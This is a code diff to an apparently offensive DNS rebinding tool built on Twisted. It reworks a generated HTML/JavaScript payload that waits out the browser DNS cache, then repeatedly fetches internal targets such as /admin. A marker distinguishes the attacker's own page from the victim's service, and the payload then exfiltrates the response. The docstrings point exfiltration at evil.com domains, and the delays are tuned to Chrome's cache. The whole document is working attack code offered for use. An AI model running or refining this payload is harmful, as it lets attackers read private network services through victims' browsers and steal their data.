@@ -41,12 +41,17 @@ from twisted.python.runtime import platform
 class PayloadGenerator:
     """Generate browser DNS rebinding attack payloads."""
     
+    # Marker to detect our own payload page (so we know rebind hasn't happened yet)
+    PAYLOAD_MARKER = '<!-- DNS-REBINDER-PAYLOAD-MARKER-7f3a9b2c -->'
+    
     @staticmethod
     def single_target(
         domain: str,
         target_port: int = 80,
         target_path: str = "/",
         delay_ms: int = 3000,
+        poll_interval_ms: int = 2000,
+        max_attempts: int = 60,
         exfil_domain: Optional[str] = None,
         exfil_callback: Optional[str] = None,
         rebinder_base: Optional[str] = None,
@@ -58,7 +63,9 @@ class PayloadGenerator:
             domain: Attack domain (e.g., attack.evil.com)
             target_port: Port to hit after rebind
             target_path: Path to fetch
-            delay_ms: Milliseconds to wait before rebind attempt
+            delay_ms: Initial delay before first rebind attempt (browser DNS cache)
+            poll_interval_ms: Seconds between rebind attempts
+            max_attempts: Maximum number of rebind attempts
             exfil_domain: Domain for DNS exfil (e.g., exfil.evil.com)
             exfil_callback: HTTP URL for data exfil
         """
@@ -92,10 +99,13 @@ class PayloadGenerator:
             console.log('STOLEN DATA:', data);
             alert('Rebind successful! Check console for data.');'''
         
+        marker = PayloadGenerator.PAYLOAD_MARKER
+        
         return f'''<!DOCTYPE html>
 <html>
 <head>
     <title>Loading...</title>
+    {marker}
     <style>
         body {{ font-family: system-ui, sans-serif; padding: 40px; background: #1a1a2e; color: #eee; }}
         .status {{ padding: 20px; border-radius: 8px; margin: 10px 0; }}
@@ -103,7 +113,7 @@ class PayloadGenerator:
         .attacking {{ background: #1f4068; }}
         .success {{ background: #1b4332; }}
         .error {{ background: #641220; }}
-        #log {{ font-family: monospace; font-size: 12px; white-space: pre-wrap; }}
+        #log {{ font-family: monospace; font-size: 12px; white-space: pre-wrap; max-height: 400px; overflow-y: auto; }}
     </style>
 </head>
 <body>
@@ -112,13 +122,16 @@ class PayloadGenerator:
     <div id="log"></div>
     
     <script>
+    // Marker used to detect if we're still hitting our own server
+    const PAYLOAD_MARKER = 'DNS-REBINDER-PAYLOAD-MARKER-7f3a9b2c';
+    
     const CONFIG = {{
         // window.location.port is empty string for default ports (80/443)
         targetPort: window.location.port ? parseInt(window.location.port) : (window.location.protocol === 'https:' ? 443 : 80),
         targetPath: '{target_path}',
         delayMs: {delay_ms},
-        maxAttempts: 30,
-        attemptIntervalMs: 1000
+        maxAttempts: {max_attempts},
+        attemptIntervalMs: {poll_interval_ms}
     }};
     
     // Check if we need to redirect to unique subdomain for same-origin fetch
@@ -152,6 +165,7 @@ class PayloadGenerator:
     function addLog(msg) {{
         const ts = new Date().toISOString().split('T')[1].slice(0,12);
         log.textContent += '[' + ts + '] ' + msg + '\\n';
+        log.scrollTop = log.scrollHeight;
         console.log(msg);
     }}
     
@@ -163,11 +177,11 @@ class PayloadGenerator:
     async function tryRebind(attempt) {{
         // Use current hostname (already unique from redirect) for same-origin
         const targetUrl = 'http://' + currentHost + ':' + CONFIG.targetPort + CONFIG.targetPath;
-        addLog('Attempt ' + attempt + ': Fetching ' + targetUrl);
+        addLog('Attempt ' + attempt + '/' + CONFIG.maxAttempts + ': Fetching ' + targetUrl);
         
         try {{
             const controller = new AbortController();
-            const timeout = setTimeout(() => controller.abort(), 3000);
+            const timeout = setTimeout(() => controller.abort(), 5000);
             
             const resp = await fetch(targetUrl, {{ 
                 signal: controller.signal,
@@ -177,8 +191,21 @@ class PayloadGenerator:
             
             const data = await resp.text();
             
-            addLog('SUCCESS! Got ' + data.length + ' bytes');
-            setStatus('🎉 Rebind successful! Exfiltrating...', 'success');
+            // Check if we got our OWN page (rebind hasn't happened yet)
+            if (data.includes(PAYLOAD_MARKER)) {{
+                addLog('⏳ Still hitting rebinder server (' + data.length + ' bytes) - waiting for DNS cache...');
+                return null; // null = keep trying, rebind not complete
+            }}
+            
+            // Got different content - rebind worked!
+            addLog('🎉 SUCCESS! Got ' + data.length + ' bytes from TARGET');
+            setStatus('🎉 Rebind successful! Exfiltrating ' + data.length + ' bytes...', 'success');
+            
+            // Show preview
+            const preview = data.substring(0, 500);
+            addLog('--- Response Preview ---');
+            addLog(preview + (data.length > 500 ? '\\n... [truncated]' : ''));
+            addLog('--- End Preview ---');
             
             // Exfiltrate{exfil_code}
             
@@ -186,34 +213,59 @@ class PayloadGenerator:
             
         }} catch (e) {{
             if (e.name === 'AbortError') {{
-                addLog('Timeout - port may be closed or filtered');
+                addLog('⏱️ Timeout - target may be slow or filtered');
             }} else {{
-                addLog('Error: ' + e.message);
+                addLog('❌ Error: ' + e.message);
             }}
             return false;
         }}
     }}
     
     async function main() {{
-        setStatus('⏳ Waiting ' + (CONFIG.delayMs/1000) + 's for DNS TTL to expire...', 'waiting');
+        const totalTime = CONFIG.delayMs + (CONFIG.maxAttempts * CONFIG.attemptIntervalMs);
+        setStatus('⏳ Waiting ' + (CONFIG.delayMs/1000) + 's for browser DNS cache...', 'waiting');
+        addLog('=== DNS Rebinding Attack ===');
         addLog('Target: ' + currentHost + ':' + CONFIG.targetPort + CONFIG.targetPath);
-        addLog('Waiting ' + CONFIG.delayMs + 'ms for DNS cache to expire...');
+        addLog('Strategy: Wait ' + (CONFIG.delayMs/1000) + 's, then poll every ' + (CONFIG.attemptIntervalMs/1000) + 's');
+        addLog('Max duration: ~' + Math.round(totalTime/1000) + 's (' + CONFIG.maxAttempts + ' attempts)');
+        addLog('');
+        addLog('Waiting ' + (CONFIG.delayMs/1000) + 's for browser DNS cache to expire...');
+        addLog('(Chrome caches ~1min, Firefox varies, Safari ~few seconds)');
         
         await new Promise(r => setTimeout(r, CONFIG.delayMs));
         
-        setStatus('🔄 Attempting rebind...', 'attacking');
+        setStatus('🔄 Polling for rebind...', 'attacking');
+        addLog('');
+        addLog('=== Starting rebind attempts ===');
         
         for (let i = 1; i <= CONFIG.maxAttempts; i++) {{
-            const success = await tryRebind(i);
-            if (success) return;
+            const result = await tryRebind(i);
+            
+            if (result === true) {{
+                // Success! We got target data
+                return;
+            }}
+            
+            if (result === false) {{
+                // Error (not just "still our page") - might be worth retrying
+            }}
+            
+            // result === null means still hitting our server, keep polling
             
             if (i < CONFIG.maxAttempts) {{
+                setStatus('🔄 Attempt ' + i + '/' + CONFIG.maxAttempts + ' - waiting ' + (CONFIG.attemptIntervalMs/1000) + 's...', 'attacking');
                 await new Promise(r => setTimeout(r, CONFIG.attemptIntervalMs));
             }}
         }}
         
         setStatus('❌ Rebind failed after ' + CONFIG.maxAttempts + ' attempts', 'error');
-        addLog('Attack failed - target may not be vulnerable or port is closed');
+        addLog('');
+        addLog('=== Attack failed ===');
+        addLog('Possible causes:');
+        addLog('  - Browser DNS cache not expiring (try longer delay)');
+        addLog('  - Target port not open');
+        addLog('  - Firewall blocking');
+        addLog('  - DNS not rebinding (check server logs)');
     }}
     
     main();
@@ -527,7 +579,12 @@ class PayloadResource(resource.Resource):
 <div class="payload">
     <h3><a href="/single">/single</a> - Single Target</h3>
     <p>Steal response from one target. Configure with query params:</p>
-    <code>/single?port=8080&path=/admin&delay=3000</code>
+    <code>/single?path=/admin&delay=70000&interval=2000&attempts=60</code>
+    <p style="font-size: 0.9em; color: #888; margin-top: 8px;">
+        delay=initial wait (ms, default 70000 for Chrome DNS cache)<br>
+        interval=poll interval (ms, default 2000)<br>
+        attempts=max tries (default 60)
+    </p>
 </div>
 
 <div class="payload">
@@ -586,13 +643,20 @@ class PayloadPage(resource.Resource):
             # Port auto-detected from URL, fallback to param, fallback to 80
             port = int(args.get('port', 80))  # Only used as JS fallback
             path = args.get('path', '/')
-            delay = int(args.get('delay', 60000))
+            # Default: 70s initial delay (Chrome DNS cache is ~60s)
+            delay = int(args.get('delay', 70000))
+            # Default: poll every 2s
+            poll_interval = int(args.get('interval', 2000))
+            # Default: 60 attempts (~2 min of polling after initial delay)
+            max_attempts = int(args.get('attempts', 60))
             
             html = PayloadGenerator.single_target(
                 domain=domain,
                 target_port=port,
                 target_path=path,
                 delay_ms=delay,
+                poll_interval_ms=poll_interval,
+                max_attempts=max_attempts,
                 exfil_domain=exfil,
                 rebinder_base=(cfg.rb_zone or f"rb.{domain}"),
             )
